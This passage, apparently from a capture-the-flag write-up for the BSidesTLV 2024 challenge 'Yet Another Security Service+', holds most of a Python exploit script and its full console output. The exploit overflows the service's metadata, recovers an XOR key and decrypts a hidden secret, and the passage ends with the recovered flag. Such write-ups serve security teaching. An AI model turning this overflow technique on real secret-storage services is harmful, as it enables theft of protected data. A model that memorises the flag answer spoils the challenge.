        raise ValueError("Secret Data Length too long")
    
    encryption = ""
    if is_encrypted:
        encryption = "and encrypting "
    log.info(f"Setting {encryption}secret {secret_id} data to: {secret_data}")

    request = Request(Commands.SET_SECRET.value, 
                      (c_ubyte * SECRET_ID_LEN)(*secret_id, 
                                                *([0] * (SECRET_ID_LEN - len(secret_id)))))
    
    request_data = RequestParams(int(is_encrypted), 
                           (c_ubyte * SECRET_DATA_LEN)(*secret_data, 
                                                       *([0] * (SECRET_DATA_LEN - len(secret_data)))))
    res = send_command(bytearray(request) + bytearray(request_data))
    if res != b"[+] done! don't forget your secret_id!":
        raise RuntimeError(res)

def get_secret(secret_id):
    if len(secret_id) > SECRET_ID_LEN:
        raise ValueError("Secret ID Length too long")
    
    log.info(f"Getting secret {secret_id} data")

    request = Request(Commands.GET_SECRET.value, 
                      (c_ubyte * SECRET_ID_LEN)(*secret_id, 
                                                *([0] * (SECRET_ID_LEN - len(secret_id)))))
    
    res = send_command(bytearray(request))
    if res == b"[-] can't get secret, invalid secret_id":
        raise RuntimeError(f"Can't read secret {secret_id}")
    return res
    
if __name__ == "__main__":
    secret_data_filler = b'.' * SECRET_DATA_LEN
    i = 0
    while i < MAX_SECRETS:
        secret_id = f"s{i}"
        set_secret(secret_id.encode(), False, secret_data_filler)
        try:
            secret = get_secret(secret_id.encode()).decode("ascii")
            log.info(f"Secret #{secret_id} read back: {secret}")
            if len(secret) != len(secret_data_filler):
                leaked_id = secret[len(secret_data_filler):]
                log.info(f"Leaked ID: '{leaked_id}'")
                i += 1
        except RuntimeError:
            log.error(f"Failed to read secret #{i}")
        i += 1
            
    seed = 0xFFFFFFFF02020202
    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],               # Last 4 bytes of meta_data[37].seed (doesn't matter)
        MetaData(0x1, 0x1, seed).to_bytes(),                  # meta_data[38]: Valid,   Encrypted,   seed = 0xFFFFFFFF02020202
        MetaData(0x0, 0x0, seed).to_bytes()[:6]               # meta_data[39]: Invalid, Unencrypted, seed LSB = 0x02020202
    ])
    secret_data = bytearray(MetaData(0x1, 0x0, 0x0)) * 10    # Doesn't matter
    set_secret(secret_id, False, secret_data)

    secret = get_secret(b"s38")
    key = xor(secret, secret_data_filler)
    log.info(f"Calculated key:\n{hexdump(key)}")

    secret_id_replacement = b'SECRETID_REPLACEMENT'

    # Write "SECRETID_REPLACEMENT" to secret_list[39].secret_id, overwriting "null"
    # secret_list[39].secret_data is unchanged
    set_secret(secret_id_replacement, False, b"\x00" * 100)

    secret_id = flat([
        MetaData(0x1, 0x0, 0x0).to_bytes()[6:],               # Last 4 bytes of meta_data[37].seed (doesn't matter)
        MetaData(0x1, 0x0, 0x0).to_bytes(),                   # meta_data[38]: Valid, Unencrypted, seed = 0 (doesn't matter)
        MetaData(0x1, 0x1, seed).to_bytes()[:6]               # meta_data[39]: Valid, Encrypted,   seed LSB = 0x02020202
    ])
    secret_data = bytearray(MetaData(0x1, 0x0, 0x0)) * 10    # Doesn't matter
    set_secret(secret_id, False, secret_data)

    secret = get_secret(secret_id_replacement)
    log.info(f"Got secret:\n{hexdump(secret)}")
    decrypted = xor(secret, key)
    log.info(f"Decrypting secret to\n{hexdump(decrypted)}")

    pattern = b'BSidesTLV2024\{[a-zA-Z0-9_]+\}'
    match = re.search(pattern, decrypted)
    if match:
        flag = match.group()
        log.success(f"Flag found: {flag.decode()}")
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service+]
└─$ python3 exploit.py
[+] Opening connection to 0.cloud.chals.io on port 23242: Done
[*] Setting secret b's0' data to: b'....................................................................................................'
[*] Getting secret b's0' data
[*] Secret #s0 read back: ....................................................................................................
[*] Setting secret b's1' data to: b'....................................................................................................'
[*] Getting secret b's1' data
[*] Secret #s1 read back: ....................................................................................................
[*] Setting secret b's2' data to: b'....................................................................................................'
[*] Getting secret b's2' data
[*] Secret #s2 read back: ....................................................................................................
[*] Setting secret b's3' data to: b'....................................................................................................'
[*] Getting secret b's3' data
[*] Secret #s3 read back: ....................................................................................................
[*] Setting secret b's4' data to: b'....................................................................................................'
[*] Getting secret b's4' data
[*] Secret #s4 read back: ....................................................................................................
[*] Setting secret b's5' data to: b'....................................................................................................'
[*] Getting secret b's5' data
[*] Secret #s5 read back: ....................................................................................................
[*] Setting secret b's6' data to: b'....................................................................................................'
[*] Getting secret b's6' data
[*] Secret #s6 read back: ....................................................................................................
[*] Setting secret b's7' data to: b'....................................................................................................'
[*] Getting secret b's7' data
[*] Secret #s7 read back: ....................................................................................................
[*] Setting secret b's8' data to: b'....................................................................................................'
[*] Getting secret b's8' data
[*] Secret #s8 read back: ....................................................................................................
[*] Setting secret b's9' data to: b'....................................................................................................'
[*] Getting secret b's9' data
[*] Secret #s9 read back: ....................................................................................................
[*] Setting secret b's10' data to: b'....................................................................................................'
[*] Getting secret b's10' data
[*] Secret #s10 read back: ....................................................................................................
[*] Setting secret b's11' data to: b'....................................................................................................'
[*] Getting secret b's11' data
[*] Secret #s11 read back: ....................................................................................................
[*] Setting secret b's12' data to: b'....................................................................................................'
[*] Getting secret b's12' data
[*] Secret #s12 read back: ....................................................................................................
[*] Setting secret b's13' data to: b'....................................................................................................'
[*] Getting secret b's13' data
[*] Secret #s13 read back: ....................................................................................................
[*] Setting secret b's14' data to: b'....................................................................................................'
[*] Getting secret b's14' data
[*] Secret #s14 read back: ....................................................................................................
[*] Setting secret b's15' data to: b'....................................................................................................'
[*] Getting secret b's15' data
[*] Secret #s15 read back: ....................................................................................................
[*] Setting secret b's16' data to: b'....................................................................................................'
[*] Getting secret b's16' data
[*] Secret #s16 read back: ....................................................................................................flag is not here
[*] Leaked ID: 'flag is not here'
[*] Setting secret b's18' data to: b'....................................................................................................'
[*] Getting secret b's18' data
[*] Secret #s18 read back: ....................................................................................................
[*] Setting secret b's19' data to: b'....................................................................................................'
[*] Getting secret b's19' data
[*] Secret #s19 read back: ....................................................................................................
[*] Setting secret b's20' data to: b'....................................................................................................'
[*] Getting secret b's20' data
[*] Secret #s20 read back: ....................................................................................................
[*] Setting secret b's21' data to: b'....................................................................................................'
[*] Getting secret b's21' data
[*] Secret #s21 read back: ....................................................................................................
[*] Setting secret b's22' data to: b'....................................................................................................'
[*] Getting secret b's22' data
[*] Secret #s22 read back: ....................................................................................................
[*] Setting secret b's23' data to: b'....................................................................................................'
[*] Getting secret b's23' data
[*] Secret #s23 read back: ....................................................................................................
[*] Setting secret b's24' data to: b'....................................................................................................'
[*] Getting secret b's24' data
[*] Secret #s24 read back: ....................................................................................................
[*] Setting secret b's25' data to: b'....................................................................................................'
[*] Getting secret b's25' data
[*] Secret #s25 read back: ....................................................................................................
[*] Setting secret b's26' data to: b'....................................................................................................'
[*] Getting secret b's26' data
[*] Secret #s26 read back: ....................................................................................................
[*] Setting secret b's27' data to: b'....................................................................................................'
[*] Getting secret b's27' data
[*] Secret #s27 read back: ....................................................................................................
[*] Setting secret b's28' data to: b'....................................................................................................'
[*] Getting secret b's28' data
[*] Secret #s28 read back: ....................................................................................................
[*] Setting secret b's29' data to: b'....................................................................................................'
[*] Getting secret b's29' data
[*] Secret #s29 read back: ....................................................................................................
[*] Setting secret b's30' data to: b'....................................................................................................'
[*] Getting secret b's30' data
[*] Secret #s30 read back: ....................................................................................................
[*] Setting secret b's31' data to: b'....................................................................................................'
[*] Getting secret b's31' data
[*] Secret #s31 read back: ....................................................................................................
[*] Setting secret b's32' data to: b'....................................................................................................'
[*] Getting secret b's32' data
[*] Secret #s32 read back: ....................................................................................................
[*] Setting secret b's33' data to: b'....................................................................................................'
[*] Getting secret b's33' data
[*] Secret #s33 read back: ....................................................................................................
[*] Setting secret b's34' data to: b'....................................................................................................'
[*] Getting secret b's34' data
[*] Secret #s34 read back: ....................................................................................................
[*] Setting secret b's35' data to: b'....................................................................................................'
[*] Getting secret b's35' data
[*] Secret #s35 read back: ....................................................................................................
[*] Setting secret b's36' data to: b'....................................................................................................'
[*] Getting secret b's36' data
[*] Secret #s36 read back: ....................................................................................................
[*] Setting secret b's37' data to: b'....................................................................................................'
[*] Getting secret b's37' data
[*] Secret #s37 read back: ....................................................................................................
[*] Setting secret b's38' data to: b'....................................................................................................'
[*] Getting secret b's38' data
[*] Secret #s38 read back: ....................................................................................................null
[*] Leaked ID: 'null'
[*] Setting secret b's40' data to: b'....................................................................................................'
[*] Getting secret b's40' data
[*] Secret #s40 read back: ....................................................................................................
[*] Setting secret b's41' data to: b'....................................................................................................'
[*] Getting secret b's41' data
[*] Secret #s41 read back: ....................................................................................................flag is not here
[*] Leaked ID: 'flag is not here'
[*] Setting secret b's43' data to: b'....................................................................................................'
[*] Getting secret b's43' data
[*] Secret #s43 read back: ....................................................................................................
[*] Setting secret b's44' data to: b'....................................................................................................'
[*] Getting secret b's44' data
[*] Secret #s44 read back: ....................................................................................................
[*] Setting secret b's45' data to: b'....................................................................................................'
[*] Getting secret b's45' data
[*] Secret #s45 read back: ....................................................................................................
[*] Setting secret b's46' data to: b'....................................................................................................'
[*] Getting secret b's46' data
[*] Secret #s46 read back: ....................................................................................................
[*] Setting secret b's47' data to: b'....................................................................................................'
[*] Getting secret b's47' data
[*] Secret #s47 read back: ....................................................................................................
[*] Setting secret b's48' data to: b'....................................................................................................'
[*] Getting secret b's48' data
[*] Secret #s48 read back: ....................................................................................................
[*] Setting secret b's49' data to: b'....................................................................................................'
[*] Getting secret b's49' data
[*] Secret #s49 read back: ....................................................................................................
[*] Setting secret b'\x00\x00\x00\x00\x01\x01\x02\x02\x02\x02\xff\xff\xff\xff\x00\x00\x02\x02\x02\x02' data to: bytearray(b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[*] Getting secret b's38' data
[*] Calculated key:
    00000000  77 a6 63 58  0b c5 e2 a2  f3 f2 79 44  16 db ee 8f  │w·cX│····│··yD│····│
    00000010  c9 36 ca 66  ee 55 0e 19  77 65 57 1f  ca ee af 77  │·6·f│·U··│weW·│···w│
    00000020  80 90 8b 1c  66 29 51 10  da 3f 49 ff  2a e4 96 e0  │····│f)Q·│·?I·│*···│
    00000030  85 d4 fd df  31 7f 7f 1e  ff 97 0f 91  fd c5 d4 ef  │····│1···│····│····│
    00000040  9b fe 6d 9a  0a 7b 27 1c  04 94 52 8d  d9 79 4b 4e  │··m·│·{'·│··R·│·yKN│
    00000050  d9 bb b8 76  60 fd 4a 90  57 86 58 c5  77 a6 63 58  │···v│`·J·│W·X·│w·cX│
    00000060  0b c5 e2 a2                                         │····│
    00000064
[*] Setting secret b'SECRETID_REPLACEMENT' data to: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Setting secret b'\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x02\x02\x02\x02' data to: bytearray(b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[*] Getting secret b'SECRETID_REPLACEMENT' data
[*] Got secret:
    00000000  77 86 43 78  2b e5 c2 82  d3 d2 3b 17  7f bf 8b fc  │w·Cx│+···│··;·│····│
    00000010  9d 7a 9c 54  de 67 3a 62  0e 56 03 40  ab de db 1f  │·z·T│·g:b│·V·@│····│
    00000020  e5 e2 d4 2c  30 4c 23 56  b6 0f 3e a0  4c 82 ae d7  │···,│0L#V│··>·│L···│
    00000030  b5 e6 9e e9  04 46 1b 29  c6 f3 37 f3  c5 f5 b0 d8  │····│·F·)│··7·│····│
    00000040  e6 fe 6d 9a                                         │··m·│
    00000044
[*] Decrypting secret to
    00000000  00 20 20 20  20 20 20 20  20 20 42 53  69 64 65 73  │·   │    │  BS│ides│
    00000010  54 4c 56 32  30 32 34 7b  79 33 54 5f  61 30 74 68  │TLV2│024{│y3T_│a0th│
    00000020  65 72 5f 30  56 65 72 46  6c 30 77 5f  66 66 38 37  │er_0│VerF│l0w_│ff87│
    00000030  30 32 63 36  35 39 64 37  39 64 38 62  38 30 64 37  │02c6│59d7│9d8b│80d7│
    00000040  7d 00 00 00  7d fd 64 64  2f 71 90 0f  0a ab 70 59  │}···│}·dd│/q··│··pY│
    00000050  a6 04 33 8a  fd 87 d6 c4  89 e1 62 a7  79 f0 60 18  │··3·│····│··b·│y·`·│
    00000060  a0 1b 39 bd                                         │··9·│
    00000064
[+] Flag found: BSidesTLV2024{y3T_a0ther_0VerFl0w_ff8702c659d79d8b80d7}
[*] Closed connection to 0.cloud.chals.io port 23242
```

The flag: `BSidesTLV2024{y3T_a0ther_0VerFl0w_ff8702c659d79d8b80d7}`